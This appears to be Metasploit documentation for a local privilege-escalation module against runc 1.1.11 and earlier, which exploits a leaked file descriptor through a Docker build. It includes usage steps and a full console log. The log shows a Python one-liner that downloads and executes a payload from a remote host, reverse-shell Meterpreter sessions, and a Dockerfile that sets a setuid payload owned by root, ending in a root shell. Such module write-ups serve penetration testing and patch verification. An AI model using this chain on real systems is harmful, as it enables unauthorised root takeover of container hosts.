## Vulnerable Application

All versions of runc <=1.1.11, as used by containerization technologies such as Docker engine,
and Kubernetes are vulnerable to an arbitrary file write.
Due to a file descriptor leak it is possible to mount the host file system
with the permissions of runc (typically root).

Successfully tested on Ubuntu 22.04 with runc 1.1.7-0ubuntu1~22.04.1 using Docker build.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Get an initial session
1. Do: `use exploit/linux/local/runc_cwd_priv_esc`
1. Do: `set session [session]`
1. Do: `run`
1. You should get a root shell.

## Options

## DOCKERIMAGE

A docker image to use, docker image must have linux commands
available (`scratch` won't work). Defaults to `alpine:latest`

## FILEDESCRIPTOR

The file descriptor to use, typically `7` or `8`. Defaults to `8`

### runc 1.1.7-0ubuntu1~22.04.1 on Ubuntu 22.04

Get an initial shell

```
user@userubuntu22:~/metasploit-framework$ ./msfconsole -qr runc.rb
[*] Processing runc.rb for ERB directives.
resource (runc.rb)> use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
resource (runc.rb)> set lhost 1.1.1.1
lhost => 1.1.1.1
resource (runc.rb)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Server started.
[*] Run the following command on the target machine:
python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://1.1.1.1:8080/v5IbTIj', context=ssl._create_unverified_context());exec(r.read());"
[*] 1.1.1.1   web_delivery - Delivering Payload (436 bytes)
[*] Sending stage (24768 bytes) to 1.1.1.1
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 1.1.1.1:45198) at 2024-02-01 18:14:09 +0000
msf6 exploit(linux/local/runc_cwd_priv_esc) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: user
meterpreter > sysinfo
Computer        : userubuntu22
OS              : Linux 5.19.0-43-generic #44~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon May 22 13:39:36 UTC 2
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter > background
[*] Backgrounding session 1...
```

Priv Esc

```
resource (runc.rb)> use exploit/linux/local/runc_cwd_priv_esc
[*] Started reverse TCP handler on 1.1.1.1:4444
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
resource (runc.rb)> set lhost 1.1.1.1
[*] Using URL: http://1.1.1.1:8080/v5IbTIj
lhost => 1.1.1.1
resource (runc.rb)> set session 1
session => 1
resource (runc.rb)> set lport 9876
lport => 9876
msf6 exploit(linux/local/runc_cwd_priv_esc) > set verbose true
verbose => true
msf6 exploit(linux/local/runc_cwd_priv_esc) > run

[*] Started reverse TCP handler on 1.1.1.1:9876
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: python
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Vulnerable runc version 1.1.7-0ubuntu1~22.04.1 detected
[*] Creating directory /tmp/.HdUvYm3
[*] /tmp/.HdUvYm3 created
[*] Uploading Payload to /tmp/.HdUvYm3/.OiGEedVKP
[*] Uploading Dockerfile to /tmp/.HdUvYm3/Dockerfile
[*] Building from Dockerfile to set our payload permissions
[*] DEPRECATED: The legacy builder is deprecated and will be removed in a future release.
[*]             Install the buildx component to build images with BuildKit:
[*]             https://docs.docker.com/go/buildx/
[*]
[*] Sending build context to Docker daemon  3.072kB
[*] Step 1/3 : FROM alpine:latest
[*]  ---> 05455a08881e
[*] Step 2/3 : WORKDIR /proc/self/fd/8
[*]  ---> Using cache
[*]  ---> f73c936557f3
[*] Step 3/3 : RUN cd ../../../../../../../../ && chmod -R 4777 tmp/.HdUvYm3 && chown -R root:root tmp/.HdUvYm3 && chmod u+s tmp/.HdUvYm3/.OiGEedVKP
[*]  ---> Running in c4afc663c2bc
[*] Removing intermediate container c4afc663c2bc
[*]  ---> b490ec709420
[*] Successfully built b490ec709420
[*] Executing payload
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 1.1.1.1
[+] Deleted /tmp/.HdUvYm3
[*] Meterpreter session 2 opened (1.1.1.1:9876 -> 1.1.1.1:43876) at 2024-02-01 18:15:04 +0000
[-] run: Interrupted
msf6 exploit(linux/local/runc_cwd_priv_esc) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: root
```
